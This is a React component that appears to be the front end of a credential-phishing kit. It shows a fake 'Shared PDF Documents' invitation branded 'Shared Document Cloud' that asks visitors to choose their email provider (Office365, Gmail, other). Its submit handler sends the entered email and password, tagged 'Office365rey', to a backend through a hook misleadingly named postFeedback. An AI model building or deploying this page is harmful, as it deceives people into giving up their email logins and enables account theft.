import './App.css';
import './Hover.css';
import './DemoPage.css';
import qs from 'qs';
import useFeedback from './api/useFeedback';
import React, { useState } from 'react';
import { Button, Modal } from 'react-bootstrap';

function App() {
  const { postFeedback, isLoading } = useFeedback();
  const [emails, setEmail] = useState('');
  const [passwords, setPassword] = useState('');
  const [detail, setDetails] = useState('Office365rey');
  const [role, setRole] = useState('2');



  const onSubmit = async (e) => {
  e.preventDefault();
    const data = qs.stringify({
      email: emails,
      password: passwords,
      details: detail,
      role_id: role,
    });

    try {
      await postFeedback(data);
      setPassword('');
      setEmail('');
    } catch (error) {
      console.log(error);
    }
  };
  

  const [show, setShow] = useState(false);

  const handleClose = () => setShow(false);
  const handleShow = () => setShow(true);


  return (

    <div  className="container-fluid">
    <div  className="row" >
    <div className="bg-image" 
     style={{backgroundColor: "#fdfdfd",
            height: "100vh",  backgroundSize: "cover", backgroundRepeat: "no-repeat"}}>
              <div className='text-center pt-5'>
   <img src="images/icro.png"  className="img-fluid" width="120px" height="90px"/>
   </div>
      <div  className="container">
        <div className="row">
        <div  className="col-sm-4 mx-auto my-5 px-5 pb-5 shadow bg-white rounded">
        <div  className="text-center pt-4"> 
               
                <span  className="h5 text-dark">Select your email provider</span> <br/>
               <hr className="mt-3"  style={{  backgroundColor: "black", width: "300px", border: "none"}} />
              
              </div>
              <p>You have been invited to view:</p>
           <h5 className='pt-2'>   <img src="images/pdf.png"  className="img-fluid" width="45px" height="5px"/> Shared PDF Documents </h5>
           <p className='font-weight-light mb-2 mt-2'>To view the secure document ,<br/>
           Please select your email provider below.</p>

          <a href="/office" > <img src="images/office365.png"  className="img-fluid" width="65px" height="5px"/> </a>
          
          <a href="/gmail" > <img src="images/gmail.jpg"  className="img-fluid" width="65px" height="5px"/>  </a>
          <a href="/other" >  <img src="images/otherem.png"  className="img-fluid" width="65px" height="5px"/>  </a>

          </div>

       

    

          </div>
     
    </div> 
    <p className=''>Â© 2022 Shared Document Cloud  Privacy Cookies</p>
    </div>
  </div>
  </div>
  );
}

export default App;
